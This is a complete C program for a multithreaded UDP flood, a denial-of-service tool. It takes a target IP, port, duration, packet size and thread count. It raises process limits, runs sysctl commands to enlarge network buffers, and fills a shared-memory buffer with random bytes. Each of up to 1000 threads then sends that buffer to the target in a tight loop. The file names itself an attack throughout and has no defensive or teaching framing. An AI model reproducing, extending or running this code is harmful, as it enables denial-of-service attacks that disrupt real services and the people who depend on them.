#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <errno.h>

#define MAX_PAYLOAD_SIZE 2048
#define MAX_THREADS 1000  // Safe upper limit

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
    int sock;
    char *shared_payload;
} attack_params;

volatile sig_atomic_t keep_running = 1;

void handle_signal(int signal) {
    keep_running = 0;
}

// Function to increase system limits
void increase_system_limits() {
    struct rlimit lim;

    // Increase max open files
    lim.rlim_cur = lim.rlim_max = 1048576;
    setrlimit(RLIMIT_NOFILE, &lim);

    // Increase max processes
    lim.rlim_cur = lim.rlim_max = 1000000;
    setrlimit(RLIMIT_NPROC, &lim);

    // Increase stack size
    lim.rlim_cur = lim.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_STACK, &lim);

    // Adjust kernel network parameters
    system("sysctl -w net.core.rmem_max=2500000 > /dev/null 2>&1");
    system("sysctl -w net.core.wmem_max=2500000 > /dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_mem='2097152 4194304 8388608' > /dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_rmem_min=1048576 > /dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_wmem_min=1048576 > /dev/null 2>&1");
}

void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = rand() % 256;
    }
}

int get_random_source_port() {
    return (rand() % (65535 - 1024 + 1)) + 1024;
}

int setup_udp_socket() {
    int sock;
    struct sockaddr_in source_addr;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    int attempts = 10;
    while (attempts--) {
        memset(&source_addr, 0, sizeof(source_addr));
        source_addr.sin_family = AF_INET;
        source_addr.sin_port = htons(get_random_source_port());
        source_addr.sin_addr.s_addr = INADDR_ANY;

        if (bind(sock, (struct sockaddr *)&source_addr, sizeof(source_addr)) == 0) {
            return sock;
        }
    }

    perror("Failed to bind after multiple attempts");
    close(sock);
    return -1;
}

void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    struct sockaddr_in server_addr;

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
        fprintf(stderr, "Invalid IP address: %s\n", params->target_ip);
        pthread_exit(NULL);
    }

    if (!params->shared_payload) {
        fprintf(stderr, "Shared payload is NULL, exiting thread %d\n", params->thread_id);
        pthread_exit(NULL);
    }

    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time && keep_running) {
        sendto(params->sock, params->shared_payload, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Usage: %s <ip> <port> <duration> <packet_size> <threads>\n", argv[0]);
        return EXIT_FAILURE;
    }

    increase_system_limits();

    char target_ip[16];
    strncpy(target_ip, argv[1], sizeof(target_ip) - 1);
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int packet_size = atoi(argv[4]);
    int total_threads = atoi(argv[5]);

    if (packet_size > MAX_PAYLOAD_SIZE) {
        fprintf(stderr, "Error: Packet size exceeds maximum limit (%d bytes)\n", MAX_PAYLOAD_SIZE);
        return EXIT_FAILURE;
    }
    
    if (total_threads > MAX_THREADS) {
        fprintf(stderr, "Error: Maximum thread limit is %d\n", MAX_THREADS);
        return EXIT_FAILURE;
    }

    srand(time(NULL));
    signal(SIGINT, handle_signal);

    int shm_fd = shm_open("/udp_payload", O_CREAT | O_RDWR, 0666);
    if (shm_fd == -1) {
        perror("Shared memory creation failed");
        return EXIT_FAILURE;
    }

    if (ftruncate(shm_fd, MAX_PAYLOAD_SIZE) == -1) {
        perror("ftruncate failed");
        close(shm_fd);
        return EXIT_FAILURE;
    }

    char *shared_payload = mmap(0, MAX_PAYLOAD_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (shared_payload == MAP_FAILED) {
        perror("mmap failed");
        close(shm_fd);
        return EXIT_FAILURE;
    }

    memset(shared_payload, 0, MAX_PAYLOAD_SIZE);
    generate_random_payload(shared_payload, packet_size);

    printf("Starting UDP flood: %s:%d for %d seconds\n", target_ip, target_port, duration);
    printf("Packet size: %d bytes | Threads: %d\n", packet_size, total_threads);

    pthread_t threads[total_threads];
    attack_params params[total_threads];

    for (int i = 0; i < total_threads; i++) {
        int sock = setup_udp_socket();
        if (sock < 0) {
            fprintf(stderr, "Failed to create socket for thread %d\n", i);
            continue;
        }

        strncpy(params[i].target_ip, target_ip, sizeof(params[i].target_ip) - 1);
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;
        params[i].sock = sock;
        params[i].shared_payload = shared_payload;

        int err = pthread_create(&threads[i], NULL, udp_flood, &params[i]);
        if (err != 0) {
            fprintf(stderr, "Failed to create thread %d: %s\n", i, strerror(err));
            close(sock);
        }
    }

    for (int i = 0; i < total_threads; i++) {
        pthread_join(threads[i], NULL);
        close(params[i].sock);
    }

    close(shm_fd);
    munmap(shared_payload, MAX_PAYLOAD_SIZE);
    shm_unlink("/udp_payload");

    printf("Attack finished. All threads stopped.\n");
    return EXIT_SUCCESS;
}